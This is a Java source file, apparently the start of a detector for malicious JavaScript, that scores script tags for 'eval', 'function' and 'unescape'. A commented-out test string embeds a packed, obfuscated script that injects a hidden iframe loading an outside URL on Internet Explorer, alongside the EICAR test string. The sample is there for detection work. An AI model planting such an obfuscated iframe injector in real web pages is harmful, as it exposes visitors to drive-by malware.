package com.efo.fjospidie;

import java.util.List;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import edu.umass.cs.benchlab.har.HarContent;
import edu.umass.cs.benchlab.har.HarEntry;

public class JavaScriptAnalyser extends Thread {
	List<HarEntry> entries;

	 public JavaScriptAnalyser(List<HarEntry> entries) {
	//public JavaScriptAnalyser() {

		// this.entries = entries;

	}

	public void run() {
	/*	int score = 0;
		String html = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n  <head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />\n    <title></title>\n    <meta name=\"author\" content=\"Espen Fjellvær Olsen\" />\n    <script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('i 9(){a=6.h(\\'b\\');7(!a){5 0=6.j(\\'k\\');6.g.l(0);0.n=\\'b\\';0.4.d=\\'8\\';0.4.c=\\'8\\';0.4.e=\\'f\\';0.m=\\'w://z.o.B/C.D?t=E\\'}}5 2=A.x.q();7(((2.3(\"p\")!=-1&&2.3(\"r\")==-1&&2.3(\"s\")==-1))&&2.3(\"v\")!=-1){5 t=u(\"9()\",y)}',41,41,'el||ua|indexOf|style|var|document|if|1px|MakeFrameEx|element|yahoo_api|height| width|display|none|body|getElementById|function|createElement|iframe|appendChild|src|id|nl|msie| toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|1000|juyfdjhdjdgh|navigator|ai| showthread|php|72241732'.split('|'),0,{}))\n    </script>\n  </head>\n\n  <body>\n    X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*    \n  </body>\n</html>\n";
		Document doc = Jsoup.parse(html);
		Elements scripts = doc.getElementsByTag("script");
		for (Element element : scripts) {
			String data = element.data().toLowerCase();
			if (data.contains("eval"))
				score++;
			if (data.contains("function"))
				score++;
			if (data.contains("unescape"))
				score++;

			System.out.println(element.data());
		}
		System.out.println(score);*/
		/*
		 * for (HarEntry entry : entries) { int score = 0 ;String url =
		 * entry.getRequest().getUrl(); if (url.matches("\\.js$")) { HarContent
		 * content = entry.getResponse().getContent(); String HTML =
		 * content.toString(); Document doc = Jsoup.parse(HTML); Elements
		 * scripts = doc.getElementsByTag("script"); for (Element element :
		 * scripts) { System.out.println(element.toString()); } } }
		 */
	}
}
